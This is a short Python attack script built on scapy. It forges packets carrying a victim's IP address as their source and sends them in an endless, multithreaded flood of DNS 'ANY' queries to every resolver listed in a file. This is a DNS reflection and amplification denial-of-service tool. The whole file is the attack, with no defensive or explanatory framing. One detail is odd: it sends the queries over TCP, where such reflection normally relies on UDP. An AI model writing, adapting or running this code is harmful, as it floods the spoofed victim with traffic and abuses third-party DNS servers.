from scapy import *
import threading
from scapy.all import *
import sys, random

# if len(sys.argv) < 3:
# 	print ("you should type -> ")
# 	sys.exit(0)




def attack(ip):
	a = IP(dst=ip,src=sys.argv[1])
	b = TCP(dport=53)
	c = DNS(rd=1)
	c.qd=DNSQR(qname='www.google.com',qtype="ANY")
	
	while True:
		send(a/b/c, verbose=0)


def IP_list():
	ip_list = []
	with open('dns.txt', 'r') as d:
		content = d.read()
	
	content = content.replace('\r','')
	content = content.replace(' ', '')
	content = content.split('\n')
	
	for ip in content:
		if ip !='':
			ip_list.append(ip)

	return ip_list

def thread(ip, length):
	thread = []
	for i in range(length):
		t = threading.Thread(target = attack, args=(ip, ))
		thread.append(t)
	return thread

def make_thread(ip_list, len):
	threads=[]


	for ip in ip_list:
		thr = thread(ip, len)
		threads.append(thr)

	return threads

ip_list = IP_list()

threads = make_thread(ip_list, int(sys.argv[2]))



for t in threads:
	for item in t:
		item.start()

